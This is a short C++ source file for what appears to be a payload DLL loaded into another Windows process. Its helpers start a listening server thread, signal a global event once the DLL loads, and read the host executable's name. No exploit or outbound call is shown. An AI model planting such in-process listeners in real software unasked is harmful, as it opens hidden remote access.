#include "payload.h"
#include "common.h"
#include "Server.h"
#include <strsafe.h>
#include <psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

DWORD WINAPI PayloadThread(LPVOID Parameter)
{
    Server* server = (Server*)Parameter;
    
    if (server)
        server->Listen();

    delete server;

    return 0;
}

BOOL SignalDllLoadEvent(LPCWSTR EventName)
{
    BOOL bResult = FALSE;
    HANDLE hEvent = NULL;
    LPWSTR pwszEventName = NULL;

    EXIT_ON_ERROR((pwszEventName = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))) == NULL);

    swprintf_s(pwszEventName, MAX_PATH, L"Global\\%ws", EventName);

    EXIT_ON_ERROR((hEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, pwszEventName)) == NULL);
    EXIT_ON_ERROR(!SetEvent(hEvent));

    bResult = TRUE;

cleanup:
    DEBUG(L"LE: %d | Result: %d", LAST_ERROR(bResult), bResult);

    if (hEvent) CloseHandle(hEvent);
    if (pwszEventName) LocalFree(pwszEventName);

    return bResult;
}

BOOL GetExeFileName(LPWSTR* FileName)
{
    BOOL bResult = FALSE;
    HANDLE hProcess = NULL;
    LPWSTR pwszImageFilePath = NULL, pwszImageFileName = NULL;

    *FileName = NULL;

    EXIT_ON_ERROR(!(*FileName = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(!(pwszImageFilePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(!(hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId())));
    EXIT_ON_ERROR(!GetProcessImageFileNameW(hProcess, pwszImageFilePath, MAX_PATH));
    EXIT_ON_ERROR((pwszImageFileName = PathFindFileNameW(pwszImageFilePath)) == pwszImageFilePath);

    wcscpy_s(*FileName, MAX_PATH, pwszImageFileName);

    bResult = TRUE;

cleanup:
    DEBUG(L"Image filename: %ws | LE: %d | Result: %d", pwszImageFileName, LAST_ERROR(bResult), bResult);

    if (hProcess) CloseHandle(hProcess);
    if (pwszImageFilePath) LocalFree(pwszImageFilePath);

    return bResult;
}